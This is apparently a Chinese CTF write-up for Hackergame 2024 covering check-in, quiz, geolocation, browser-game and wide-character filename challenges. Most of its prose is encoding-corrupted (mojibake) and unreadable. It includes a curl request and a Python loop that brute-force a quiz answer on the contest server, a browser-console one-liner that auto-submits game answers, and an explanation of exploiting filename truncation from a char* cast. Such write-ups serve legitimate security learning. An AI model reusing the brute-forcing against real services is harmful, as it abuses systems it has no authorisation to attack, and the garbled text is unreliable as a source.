ä¸å¤šbbï¼Œç›´æ¥å¼€å§‹ã€‚

# ç­¾åˆ°

> è®©æˆ‘ä»¬è¯´â€¦â€¦å„ç§è¯­è¨€ï¼Œå¼€å§‹ä»Šå¹´çš„å†’é™©ï¼

è®¿é—®é¢˜ç›®åï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥12ç§è¯­è¨€çš„â€œå¯åŠ¨â€ã€‚

![](images/672f00f3d29ded1a8c3064c9.png)

çœŸçš„è¦å®‰è£…12ç§è¾“å…¥æ³•å—ï¼Ÿå¯¹ï¼Œå¯¹å—ï¼Ÿ

ç›´æ¥å¯åŠ¨ï¼Œå…ˆå¬æ­Œï¼š

![](images/672f0163d29ded1a8c30b943.png)

å¬æ­Œç»“æŸåï¼Œæ³¨æ„åˆ°ï¼šhttp://202.38.93.141:12024/?pass=`false`

æŠŠfalseæ”¹ä¸ºtrueå³è·å¾—flagï¼šflag{WE1cOME-to-h@CKErgAMe-anD-eNjoY-hACkiN9-z0Z4}

![](images/672f3c36d29ded1a8c6a27c7.jpg)

```
[Verse]
Hackergame å“¦ Hackergame å“¦ Hackergame
æœ‰äº†ä½  ç”Ÿæ´»ç¾å¥½ æ²¡çƒ¦æ¼
Hackergameä¼ å¥‡ å¥‡å¦™è‡³æ
æœ€æ£’æ¯”èµ› äººäººèµå¹ä½ 

[Chorus]
å—¯å—¯å—¯å—¯å—¯ Hackergameæ¯”èµ› ç¾¤è‹±é½èš
Hackergameç§°éœ¸ æ€è·¯ä¸æ­¢
æœ€æ£’æ¯”èµ› æœ€å¦™ä½“éªŒ
æ¬¢å‘¼æ­¤æ—¶ï¼

[Verse 2]
å¦‚æœå¡å…³ é‚£å¯ä¸å¯¹
ä»Šæ™šæ²¡æ‹¿ flag æˆ‘å°±ä¼šå¼å«
æ— è®ºç™½å¤© è¿˜æ˜¯å¤œæ™š
Hackergameçš„æŒ‘æˆ˜ è®©å¤´è„‘æ¸…é†’

[Chorus]
å—¯å—¯å—¯å—¯å—¯ Hackergameæ¯”èµ› ç¾¤è‹±é½èš
Hackergameç§°éœ¸ æ€è·¯ä¸æ­¢
æœ€æ£’æ¯”èµ› æœ€å¦™ä½“éªŒ
æ¬¢å‘¼æ­¤æ—¶ï¼

[Bridge]
åœ¨é…·æš‘æˆ–å¯’å†¬ Hackergameçš„é­…åŠ›
è®©çƒ­æƒ…æµ“ è®©çƒ­æƒ…æµ“
è§£é¢˜å¦‚æ¢¦ åƒä¸­å¤§å¥–çš„ç‹‚å–œ

[Chorus]
å—¯å—¯å—¯å—¯å—¯ Hackergameå“¦ Hackergameå“¦ Hackergame
æœ€æ£’æ¯”èµ› æœ€å¦™ä½“éªŒ
æ¬¢å‘¼æ­¤æ—¶ï¼
```

# å–œæ¬¢ç­¾åˆ°çš„CTFerä½ ä»¬å¥½å‘€

>  å–œæ¬¢åšç­¾åˆ°çš„ CTFer ä½ ä»¬å¥½å‘€ï¼Œæˆ‘æ˜¯ä¸€é“æ›´**å…¸å‹**çš„ checkinï¼šæœ‰ä¸¤ä¸ª flag å°±è—åœ¨ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦æ ¡å†… CTF æˆ˜é˜Ÿçš„æ‹›æ–°ä¸»é¡µé‡Œï¼

USTC CTFæ‹›æ–°ä¸»é¡µåœ¨å“ªå‘¢ï¼Ÿè®¿é—®Hackergameä¸»é¡µï¼š

![](images/672f027ed29ded1a8c319054.png)

è¿›å»ä¹‹åæ˜¯ä¸€ä¸ªç½‘é¡µç»ˆç«¯ã€‚

![](images/672f02d4d29ded1a8c31d3db.png)

è¾“å…¥helpæŸ¥çœ‹ä¸€ä¸‹å¯ç”¨å‘½ä»¤ï¼š

```
Welcome! Here are all the available commands:

=========== Available Commands ===============

about awards banner bing cat cd echo
email env github help ls members nvim
readme repo sudo sumfetch vi whoami 

==============================================

Helpful Tips:
    [tab]: trigger completion.
    [ctrl+l]/clear: clear terminal.
    Type 'sumfetch' to display summary.

Credit: Based on Cveinnt's awesome LiveTerm.
```

é¦–å…ˆæ‰§è¡Œsudoçœ‹çœ‹ï¼Œå‘ç°ä¼šè·³è½¬åˆ°Bç«™è§‚çœ‹ã€Šå¥¶é¾™ã€‹åŠ¨ç”»ã€‚å³ä¸‹è§’æœ‰å¤‡æ¡ˆå·ï¼š

![](images/672f0351d29ded1a8c3239df.png)

~~æ•…flagä¸º`flag{0910417220504011}`ï¼Œæäº¤åˆ°æ¯”èµ›å¹³å°æç¤ºâ€œç­”æ¡ˆé”™è¯¯â€ï¼Œç­‰å®Œèµ›åä½ å°±ä¼šå‡ºç°åœ¨æç¬‘flagé‡Œã€‚~~

## Checkin Again

ä¸Šè¿°å‘½ä»¤ä¸­å¯ä»¥æŸ¥çœ‹ä¿¡æ¯çš„è¿˜æœ‰`env` `ls` `cat`ç­‰æŒ‡ä»¤ã€‚å…ˆçœ‹çœ‹envï¼š

```
ctfer@ustc-nebula:$ ~
env
PWD=/root/Nebula-Homepage
ARCH=loong-arch
NAME=Nebula-Dedicated-High-Performance-Workstation
OS=NixOSâ„ï¸
FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
```

å³å¾—Flag 1ã€‚

## Checkin Again & Again

```
ctfer@ustc-nebula:~ $ ls -la
.flag
.oh-you-found-it/
Awards
Members
Welcome-to-USTC-Nebula-s-Homepage/
and-We-are-Waiting-for-U/

ctfer@ustc-nebula:~ $ cat .flag
flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}
```

ezã€‚

# çŒ«å’ªé—®ç­”ï¼ˆHackergame åå‘¨å¹´çºªå¿µç‰ˆï¼‰

1. åœ¨ Hackergame 2015 æ¯”èµ›å¼€å§‹å‰ä¸€å¤©æ™šä¸Šå¼€å±•çš„èµ›å‰è®²åº§æ˜¯åœ¨å“ªä¸ªæ•™å®¤ä¸¾è¡Œçš„ï¼Ÿ**ï¼ˆ30 åˆ†ï¼‰**

   åœ¨USTC LUGç½‘ç«™ä¸€ç•ªæ¢ç´¢ï¼Œå‘ç°åœ¨`https://lug.ustc.edu.cn/wiki/lug/events/hackergame/`ä¸‹æœ‰ç¬¬äºŒå±Šï¼ˆ2014+1ï¼‰Hackergameçš„æ´»åŠ¨å½’æ¡£ï¼š

   ![](images/672f05c7d29ded1a8c344bc8.png)

   è¿›å…¥æ­¤é¡µé¢ï¼Œæ³¨æ„åˆ°

   >æ¯”èµ›æ—¶é—´å®‰æ’
   >
   >10 æœˆ 17 æ—¥ å‘¨å…­æ™šä¸Š 19:30 3A204 ç½‘ç»œæ”»é˜²æŠ€å·§è®²åº§ 10 æœˆ 18 æ—¥ å‘¨æ—¥ä¸Šåˆ 10:00 åˆèµ› åœ¨çº¿å¼€å±• 10 æœˆ 24 æ—¥ å‘¨å…­å‡Œæ™¨ 00:00 åˆèµ›ç»“æŸ åç»­å¼€å±•å¤èµ›

â€‹	æ•…ç­”æ¡ˆä¸º3A204ã€‚

2. ä¼—æ‰€å‘¨çŸ¥ï¼ŒHackergame å…±çº¦ 25 é“é¢˜ç›®ã€‚è¿‘äº”å¹´ï¼ˆä¸å«ä»Šå¹´ï¼‰ä¸¾åŠçš„ Hackergame ä¸­ï¼Œé¢˜ç›®æ•°é‡æœ€æ¥è¿‘è¿™ä¸ªæ•°å­—çš„é‚£ä¸€å±Šæ¯”èµ›é‡Œæœ‰å¤šå°‘äººæ³¨å†Œå‚åŠ ï¼Ÿ**ï¼ˆ30 åˆ†ï¼‰**

   åœ¨Hackergameä¸»é¡µæ‰¾åˆ°å¾€å¹´æ–°é—»ç¨¿ï¼š

   ![](images/672f0662d29ded1a8c34cb8d.png)

   ç»“åˆå¾€å¹´Write-Upä¸­çš„é¢˜ç›®æ•°é‡å¾—çŸ¥ï¼Œç­”æ¡ˆä¸º2682äººï¼Œæ˜¯2019å¹´çš„Hackergameï¼ˆç¬¬å…­å±Šï¼‰ã€‚

3. Hackergame 2018 è®©å“ªä¸ªçƒ­é—¨æ£€ç´¢è¯æˆä¸ºäº†ç§‘å¤§å›¾ä¹¦é¦†å½“æœˆçƒ­æœç¬¬ä¸€ï¼Ÿ**ï¼ˆ20 åˆ†ï¼‰**

   æŸ¥æ‰¾2018å¹´HackergameçŒ«å’ªé—®ç­”çš„writeupï¼š`https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md`

   > åœ¨ä¸­å›½ç§‘å¤§å›¾ä¹¦é¦†ä¸­ï¼Œæœ‰ä¸€æœ¬ä¹¦å«åšã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»:é“¾æ¥ã€è£…è½½ä¸åº“ã€‹ï¼Œè¯·é—®å®ƒçš„ç´¢ä¹¦å·æ˜¯ï¼Ÿ
   >
   > æ‰“å¼€[ä¸­å›½ç§‘å¤§å›¾ä¹¦é¦†ä¸»é¡µ](https://lib.ustc.edu.cn/)ï¼Œç›´æ¥æœç´¢â€œç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»â€å³å¯ã€‚

â€‹	æ•…ç­”æ¡ˆä¸ºâ€œç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»â€ã€‚

4. åœ¨ä»Šå¹´çš„ USENIX Security å­¦æœ¯ä¼šè®®ä¸Šä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å‘è¡¨äº†ä¸€ç¯‡å…³äºç”µå­é‚®ä»¶ä¼ªé€ æ”»å‡»çš„è®ºæ–‡ï¼Œåœ¨è®ºæ–‡ä¸­ä½œè€…æå‡ºäº† 6 ç§æ”»å‡»æ–¹æ³•ï¼Œå¹¶åœ¨å¤šå°‘ä¸ªç”µå­é‚®ä»¶æœåŠ¡æä¾›å•†åŠå®¢æˆ·ç«¯çš„ç»„åˆä¸Šè¿›è¡Œäº†å®éªŒï¼Ÿ**ï¼ˆ10 åˆ†ï¼‰**

   ![](images/672f07b1d29ded1a8c35ef7f.png)

   ç­”æ¡ˆä¸º336ã€‚

5. 10 æœˆ 18 æ—¥ Greg Kroah-Hartman å‘ Linux é‚®ä»¶åˆ—è¡¨æäº¤çš„ä¸€ä¸ª patch æŠŠå¤§é‡å¼€å‘è€…ä» MAINTAINERS æ–‡ä»¶ä¸­ç§»é™¤ã€‚è¿™ä¸ª patch è¢«åˆå¹¶è¿› Linux mainline çš„ commit id æ˜¯å¤šå°‘ï¼Ÿ**ï¼ˆ5 åˆ†ï¼‰**

   > # Commit 6e90b67
   >
   > committed 3 weeks ago
   >
   > MAINTAINERS: Remove some entries due to various compliance requirements.
   >
   > Remove some entries due to various compliance requirements. They can come back in the future if sufficient documentation is provided. Link: https://lore.kernel.org/r/2024101835-tiptop-blip-09ed@gregkh Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

â€‹	ä¸çŸ¥é“è¿™ä¸ªå¯ä»¥é‡å¼€äº†ã€‚ç­”æ¡ˆä¸º6e90b6ã€‚

â€‹	Code is cheap. Show me your nationality.

6. å¤§è¯­è¨€æ¨¡å‹ä¼šæŠŠè¾“å…¥åˆ†è§£ä¸ºä¸€ä¸ªä¸€ä¸ªçš„ token åç»§ç»­è®¡ç®—ï¼Œè¯·é—®è¿™ä¸ªç½‘é¡µçš„ HTML æºä»£ç ä¼šè¢« Meta çš„ Llama 3 70B æ¨¡å‹çš„ tokenizer åˆ†è§£ä¸ºå¤šå°‘ä¸ª tokenï¼Ÿ**ï¼ˆ5 åˆ†ï¼‰**

   ç›´æ¥å³é”®å¤åˆ¶æºä»£ç ï¼Œç„¶åå‰å¾€chat.groq.comè·å¾—çš„tokenæ•°å¹¶ä¸å¯¹ï¼ˆ1840ï¼‰ã€‚å®é™…æ¯”èµ›ä¸­ç¾¤å†…ä¹Ÿæœ‰å¤§é‡åé¦ˆæ— æ³•è·å¾—æ­£ç¡®ç­”æ¡ˆã€‚ä½†å†åŠ ä¸ŠæŸä¸ªåœ¨çº¿Llama 3 tokenizerçš„è®¡æ•°ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥å¤§ä½“ç¡®å®štokensèŒƒå›´ï¼ˆ1800-1900ï¼‰ã€‚

   ç›´æ¥çˆ†ç ´ã€‚æŠ“åŒ…ï¼š

   ```bash
   curl 'http://202.38.93.141:13030/' \
     -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
     -H 'Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7' \
     -H 'Cache-Control: no-cache' \
     -H 'Connection: keep-alive' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H 'Cookie: session=YuShengJun' \
     -H 'DNT: 1' \
     -H 'Origin: http://202.38.93.141:13030' \
     -H 'Pragma: no-cache' \
     -H 'Referer: http://202.38.93.141:13030/' \
     -H 'Upgrade-Insecure-Requests: 1' \
     -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' \
     --data-raw 'q1=3A204&q2=2682&q3=%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB&q4=336&q5=6e90b6&q6=1833' \
     --insecure
   ```

   å†™ä¸€ä¸ªpythonè„šæœ¬å¯¹q6å‚æ•°è¿›è¡Œçˆ†ç ´ã€‚

   ```python
   import requests
   
   # ç›®æ ‡URL
   url = 'http://202.38.93.141:13030/'
   
   # è¯·æ±‚å¤´
   headers = {
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
       'Accept-Language': 'zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7',
       'Cache-Control': 'no-cache',
       'Connection': 'keep-alive',
       'Content-Type': 'application/x-www-form-urlencoded',
       'Cookie': 'session=YuShengJun',
       'DNT': '1',
       'Origin': 'http://202.38.93.141:13030',
       'Pragma': 'no-cache',
       'Referer': 'http://202.38.93.141:13030/',
       'Upgrade-Insecure-Requests': '1',
       'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
   }
   
   # åŸå§‹æ•°æ®
   data = {
       'q1': '3A204',
       'q2': '2682',
       'q3': 'ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»',
       'q4': '336',
       'q5': '6e90b6',
       'q6': ''
   }
   
   # æ£€æŸ¥å­—ç¬¦ä¸²
   check_string = "æœ¬æ¬¡æµ‹éªŒæ€»å¾—åˆ†ä¸º 95"
   
   # éå†q6å€¼
   for q6_value in range(1800, 1901):
       data['q6'] = str(q6_value)
       response = requests.post(url, headers=headers, data=data)
       
       print(f"Sent request with q6={q6_value}")
       print("Response status code:", response.status_code)
       
       if check_string not in response.text:
           print(f"Found q6 value that does not match the check string: {q6_value}")
           break
       
       print("Response content:", response.text[:200])  # æ‰“å°å“åº”çš„å‰200ä¸ªå­—ç¬¦
   ```

   å¾—ç­”æ¡ˆä¸º1833ã€‚

# æ‰“ä¸å¼€çš„ç›’

ä½¿ç”¨`https://www.3dpea.com/cn/view-STL-online`åœ¨çº¿æµè§ˆç›’å­STLæ¨¡å‹ï¼Œæ‘„åƒå¤´ä¼¸è¿›å»å³å¯çœ‹åˆ°flagã€‚

![](images/672f0bc9d29ded1a8c39f5c7.png)

# æ¯”å¤§å°ç‹

æ‰“å¼€ç½‘é¡µåå¼€F12ï¼Œæ³¨æ„åˆ°æœ€åº•éƒ¨æœ‰scriptï¼š

```javascript
    function loadGame() {
      fetch('/game', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({}),
      })
        .then(response => response.json())
        .then(data => {
          state.values = data.values;
          // ......
```

æŸ¥çœ‹ç½‘ç»œåŒ…ï¼š

![](images/672f0d47d29ded1a8c3b3325.png)

é¢˜ç›®æ•°æ®å­˜å‚¨åœ¨state.valueså†…ã€‚å› æ­¤ï¼Œåªéœ€è¦åœ¨å€’è®¡æ—¶ç»“æŸåæ‰“å¼€F12æ‰§è¡Œ

```javascript
submit(state.values.map(([a,b]) => a<b? '<' : '>' ))
```

å³å¯ã€‚æ³¨æ„å¦‚æœåœ¨æ¯”èµ›å¼€å§‹å€’è®¡æ—¶ç»“æŸå‰å°±æäº¤ï¼Œä¼šè¢«â€œæ£€æµ‹åˆ°æ—¶ç©ºç©¿è¶Šâ€ã€‚

# æ—…è¡Œç…§ç‰‡ 4.0

> ã€Œåˆè¦é‡å¤å—ï¼Œç»æœ›çš„è½®å›ã€

## LEO_CHAN?

> > ä½ ä»¬çš„ç”Ÿæ´»åˆ°åº•çœŸçš„å‡çš„å‘€ï¼Ÿæ¯å¤©è¦ä¹ˆå°±æ˜¯çœ‹æ¼«å±•çœ‹å¶åƒçœ‹ live å–é…’åƒçƒ§çƒ¤ï¼Œè¦ä¹ˆå°±æ˜¯è¿™é‡Œé‚£é‡Œæ—…æ¸¸ã€‚é˜µå®¹ä¸€å®£ï¼Œè¯´å†²å°±å†²ï¼Œç¾¤ä¸€æ‹‰ï¼Œæœºç¥¨ä¸€ä¹°ï¼Œé’±å°±åƒå¤§é£åˆ®æ¥çš„ï¼Œæ—¶é—´å¥½åƒä¸€ç›´æœ‰ã€‚c\*\*4 ä½ ä»¬ä¹Ÿå»ï¼Œmu\*\*ca ä½ ä»¬ä¹Ÿå»ï¼Œm\*\*o ä½ ä»¬ä¹Ÿå»ï¼Œto\*ea\*i ä½ ä»¬ä¹Ÿå»ã€‚æˆ‘æ€ä¹ˆä¸€å¤©åˆ°æ™šéƒ½åœ¨ä¸Šç­å•Šï¼Œä½ ä»¬é‚£åˆ°åº•æ˜¯æ€ä¹ˆå¼„çš„å‘€ï¼Ÿæ•™æ•™æˆ‘è¡Œä¸è¡Œ
>
> ![](images/672f1062d29ded1a8c3da79c.png)
>
> 

1. **ç…§ç‰‡æ‹æ‘„çš„ä½ç½®è·ç¦»ä¸­ç§‘å¤§çš„å“ªä¸ªæ ¡é—¨æ›´è¿‘ï¼Ÿï¼ˆæ ¼å¼ï¼š**`Xæ ¡åŒºYé—¨`**ï¼Œå‡ä¸ºä¸€ä¸ªæ±‰å­—ï¼‰**

   é«˜å¾·æœç´¢â€œç§‘é‡Œç§‘æ°”ç§‘å¤§é©¿ç«™â€ï¼Œæ—¢ç„¶æ˜¯è·ç¦»ä¸­ç§‘å¤§å“ªä¸ªé—¨æœ€è¿‘ï¼Œé‚£è‚¯å®šæ˜¯ç§‘å¤§ç«™ã€‚ç­”æ¡ˆä¸ºä¸œæ ¡åŒºè¥¿é—¨ã€‚

![](images/672f0f5fd29ded1a8c3cee25.png)

2. è¯è¯´ Leo é…±ä¸Šæ¬¡å‡ºç°åœ¨æ¡æ¶ä¸Šæ˜¯â€¦â€¦ç§‘å¤§ä»Šå¹´çš„ ACG éŸ³ä¹ä¼šï¼Ÿæ´»åŠ¨æ—¥æœŸæˆ‘æ²¡è®°é”™çš„è¯æ˜¯ï¼Ÿï¼ˆæ ¼å¼ï¼š`YYYYMMDD`ï¼‰

   Bç«™æœç´¢â€œä¸­ç§‘å¤§ACGéŸ³ä¹ä¼šâ€ï¼Œæ‰¾åˆ°â€œä¸­ç§‘å¤§LEOåŠ¨æ¼«åä¼šâ€è´¦å·ï¼Œç¿»æ‰¾åŠ¨æ€å‘ç°ï¼š

   ![](images/672f10f2d29ded1a8c3e17e4.png)

   ç­”æ¡ˆä¸º20240519ã€‚

## FULL_RECALL

> ã€Œæ‹ç…§çš„æ—¶å€™å¸¦ç€ LEO é…±çœ‹èµ·æ¥æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€ï¼Œå›å¿†å®Œä¸Šæ¬¡çš„ ACG éŸ³ä¹ä¼šï¼Œä½ è¿™æ ·æƒ³åˆ°ï¼Œä¸è¿‡è¯´åˆ°åº•è¦å»å“ªé‡Œå‘¢ï¼Ÿ
>
> è¿™æ ·æƒ³ç€ï¼Œä½ æ‰“å¼€è‡ªå·±çš„ç›¸å†Œç¿»æ‰¾ï¼Œã€Œæˆ‘è®°å¾—ä¹‹å‰ä¿å­˜äº†å‡ ä¸ªè¿˜ä¸é”™çš„åœ°æ–¹â€¦â€¦ã€
>
> ![](images/672f117ad29ded1a8c3e8b03.png)
>
> ![](images/672f11a9d29ded1a8c3eb230.png)
>
> å—¯ï¼Ÿå¥‡æ€ªçš„è®°å¿†å¢åŠ äº†ã€‚è¯¶ï¼Œæˆ‘åˆ°è¿‡è¿™äº›åœ°æ–¹å—ï¼Ÿè€Œä¸”è¿™ä¸¤å¼ ç…§ç‰‡æ‹æ‘„åœ°çš„è·ç¦»â€¦â€¦æ˜¯ä¸æ˜¯æœ‰ç‚¹è¿œï¼Ÿ

3. **è¿™ä¸ªå…¬å›­çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆä¸éœ€è¦å¡«å†™å…¬å›­æ‰€åœ¨å¸‚åŒºç­‰ä¿¡æ¯ï¼‰**

   æ³¨æ„åˆ°åƒåœ¾æ¡¶ä¸Šæœ‰â€œå…­å®‰å›­æ—â€å­—æ ·ã€‚

   ![](images/672f120ed29ded1a8c3f052d.png)

   æ³¨æ„åˆ°å…¬å›­æ­¥é“ä¸Šæœ‰å½©è™¹ï¼Œæ•…æœç´¢â€œå…­å®‰  å½©è™¹  æ­¥é“â€ï¼š

   ![](images/672f128ad29ded1a8c3f66b0.png)

   ç­”æ¡ˆä¸ºä¸­å¤®å…¬å›­ã€‚

   

4. **è¿™ä¸ªæ™¯è§‚æ‰€åœ¨çš„æ™¯ç‚¹çš„åå­—æ˜¯ï¼Ÿï¼ˆä¸‰ä¸ªæ±‰å­—ï¼‰**

   ä½¿ç”¨Google Lensæœç´¢ç›®æ ‡å›¾ç‰‡ï¼š

   ![](images/672f1351d29ded1a8c40117e.png)

   ç­”æ¡ˆä¸ºå›å­å²­ã€‚

## OMINOUS_BELL

> è°ƒæŸ¥è‡ªå·±è¿˜æ˜¯å¤´ä¸€å›ï¼Œå¤šæ–°é²œå•Šã€‚ä¸è¿‡ï¼Œè¿˜æ²¡æ¥å¾—åŠç†æ¸…å¤´ç»ªï¼Œä½ çªç„¶æ”¶åˆ°äº†æ¥è‡ªå­¦é•¿çš„ä¿¡æ¯ï¼š
>
> > ![](images/672f13ced29ded1a8c408002.png)
> >
> > æ¥ç»ƒç»ƒæ‰‹ï¼Œçœ‹çœ‹èƒ½æŒ–å‡ºä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ã€‚
>
> ç³Ÿäº†ï¼Œä¸‰ç•ªäº”æ¬¡è°ƒæŸ¥å­¦é•¿è¢«ä»–å‘ç°äº†ï¼Ÿä¸è¿‡ï¼Œè¿™ä¸ªç…§ç‰‡ç¡®å®æœ‰è¶£ï¼Œä¼¼ä¹æœ‰è¾†å¾ˆæ ‡å¿—æ€§çš„â€¦â€¦**å››ç¼–ç»„åŠ¨è½¦**ï¼Ÿ

6. å·¦ä¸‹è§’çš„åŠ¨è½¦ç»„å‹å·æ˜¯ï¼Ÿ

   æ³¨æ„é¢˜ç›®ä¸­æœ‰æåˆ°â€œå››ç¼–ç»„åŠ¨è½¦â€ï¼Œå³CRH6A-Aæˆ–CRH6F-Aç³»åˆ—ã€‚

   CRH6A-Aä¸»è¦ç”¨äºæˆéƒ½â€œå¤©åºœå·â€ï¼Œæ¶‚è£…å¦‚ä¸‹ï¼š

   ![](images/672f1507d29ded1a8c418f64.png)

   å¾ˆæ˜æ˜¾æ¶‚è£…ä¸ç¬¦åˆã€‚

   CRH6F-Aä¸»è¦ç”¨äºåŒ—äº¬ã€å°å·ã€è¿äº‘æ¸¯ã€é˜³æ³‰ã€æµ·å£ç­‰å¸‚åŸŸé“è·¯ã€‚å‘ç°åŒ—äº¬â€œæ€€å¯†å·â€çš„æ¶‚è£…ç¬¦åˆå›¾ç‰‡ç‰¹å¾ï¼š

   ![](images/672f1594d29ded1a8c420d8a.png)

   æ•…ç­”æ¡ˆä¸ºCRH6F-Aã€‚ä½äºåŒ—äº¬ã€‚

7. **è·ç¦»æ‹æ‘„åœ°æœ€è¿‘çš„åŒ»é™¢æ˜¯ï¼Ÿï¼ˆæ— éœ€åŒ…å«é™¢åŒºã€åœ°åä¿¡æ¯ï¼Œæ ¼å¼ï¼šXXXåŒ»é™¢ï¼‰**

   æ³¨æ„åˆ°å›¾ç‰‡å†…æ¸…ä¸€è‰²åœæ”¾åŠ¨è½¦ç»„ï¼Œä¸”ï¼š

   ![](images/672f162dd29ded1a8c428228.png)

   CR-å¤å…´å·ã€‚æ•…æ­¤å¤„ä¸ºåŠ¨è½¦æ‰€ã€‚

   é«˜å¾·æœç´¢â€œåŒ—äº¬ åŠ¨è½¦æ‰€â€ï¼Œå¹¶å¯»æ‰¾é™„è¿‘æœ‰åŒ»é™¢çš„åŠ¨è½¦æ‰€ã€‚æ³¨æ„åˆ°ï¼š

   ![](images/672f172dd29ded1a8c43ac63.png)

   å«æ˜Ÿå›¾ç‰¹å¾å»åˆã€‚

   ![](images/672f17dad29ded1a8c4469a7.png)

   æ•…ç­”æ¡ˆä¸º ç§¯æ°´æ½­åŒ»é™¢ã€‚

   

# ä¸å®½çš„å®½å­—ç¬¦

> æˆ‘èªçˆ²å°Aæ‡‰è©²è¢«å–æ¶ˆç¨‹åºå“¡è³‡æ ¼ï¼
>
> â€”â€”ç™¼è‡ªæˆ‘çš„iPhone

ä¸‹é¢æˆ‘ä»¬ä»¥â€œæ²Ÿæ§½çš„â€æŒ‡ä»£å°Aã€‚

æ³¨æ„åˆ°æ²Ÿæ§½çš„ä»£ç ï¼š

```cpp
 // Convert to WIDE chars
    wchar_t buf[256] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, inputBuffer, -1, buf, sizeof(buf) / sizeof(wchar_t));

    std::wstring filename = buf;
```

æ²Ÿæ§½çš„åœ¨æ­¤å¤„å°†ä»Consoleè¯»å…¥çš„çª„å­—ç¬¦è½¬æ¢ä¸ºå®½å­—ç¬¦ã€‚ç”±äºcharç±»å‹å 1ä¸ªByteï¼Œwchar_tå 2ä¸ªBytesï¼Œå› æ­¤ï¼Œå¯¹äºè¿™æ ·ä¸€æ®µæ•°æ®ï¼š

```
31 32 33 34
```

æŠŠå®ƒè½¬æ¢ä¸ºå°ç«¯å®½å­—ç¬¦ï¼ˆUTF-16LEï¼‰åï¼Œå®é™…æ•°æ®å³ä¸ºï¼š

```
31 00 32 00 33 00 34 00
```

> å¯æƒœçš„æ˜¯ï¼ŒæŸäº›ç‰ˆæœ¬çš„ C++ ç¼–è¯‘å™¨ä»¥åŠå…¶è‡ªå¸¦çš„å¤´æ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶åæ˜¯ `char` ç±»å‹çš„ï¼Œå› æ­¤è¿™å¹¶ä¸æ­£ç¡®ã€‚è¿™æ—¶å€™å° A çµå…‰ä¸€é—ªï¼Œæ¬¸ğŸ¤“ğŸ‘†ï¼Œæˆ‘ä¸ºä»€ä¹ˆä¸åšä¸€ä¸ªè½¬æ¢å‘¢ï¼Ÿäºæ˜¯ï¼š
>
> ```
> std::wifstream f((char*)filename);
> ```
>
> éšä¾¿æ‰¾äº†ä¸€ä¸ªæ–‡ä»¶åæµ‹è¯•è¿‡æ— è¯¯åï¼Œå° A å¯¹è‡ªå·±çš„æ–¹æ¡ˆéå¸¸è‡ªä¿¡ï¼Œå¤§èƒ†çš„åœ¨å„ä¸ªåœ°æ–¹å¤ç”¨è¿™æ®µä»£ç ã€‚ç„¶è€Œï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ

æˆ‘ä¸çŸ¥æ²Ÿæ§½çš„æ˜¯å¦‚ä½•æµ‹è¯•é€šè¿‡çš„ã€‚å‡å¦‚æŠŠä¸Šé¢çš„å®½å­—èŠ‚å¼ºåˆ¶è½¬ä¸ºçª„å­—èŠ‚åï¼Œ

```cpp
std::wifstream file;
file.open((char*)filename.c_str());
```

file.openè¯»å…¥charç±»å‹æ–‡ä»¶åæ—¶ï¼Œä¼šåœ¨0x00å¤„æˆªæ–­ã€‚å› æ­¤ï¼Œå½“ä½ åœ¨Consoleè¾“å…¥1234æ—¶ï¼Œå®é™…æ–‡ä»¶åå…¶å®æ˜¯ï¼š1

```
31    (00 32 00 33 00 34 00  è¢«æˆªæ–­)
```

ä½†è¿™ä¸å¦¨ç¢æˆ‘ä»¬è·å¾—æ²Ÿæ§½çš„flagã€‚è‡³æ­¤æ€è·¯å·²éå¸¸ç®€å•ï¼šæˆ‘ä»¬åªéœ€è¦è¾“å…¥ä¸€ä¸ªå°ç«¯å®½å­—èŠ‚æ•°æ®ï¼Œä½¿å…¶è½¬æ¢ä¸ºçª„å­—èŠ‚åæ˜¯Z:/theflagï¼Œé—®é¢˜å°±è§£å†³äº†ã€‚

> ä½ å¯èƒ½æ³¨æ„åˆ°æˆ‘ä¸€ç›´åœ¨å¯¹Windowsç¨‹åºè¯´â€œUTFâ€ï¼Œç”šè‡³ä¸Šé¢çš„æ–‡ä»¶åæ˜¯â€œ/â€è€Œä¸æ˜¯â€œ\â€ã€‚è¿™æ˜¯å› ä¸ºæ²Ÿæ§½çš„ç¨‹åºæ˜¯åœ¨linux dockerä¸‹ä½¿ç”¨wineè¿è¡Œçš„ã€‚

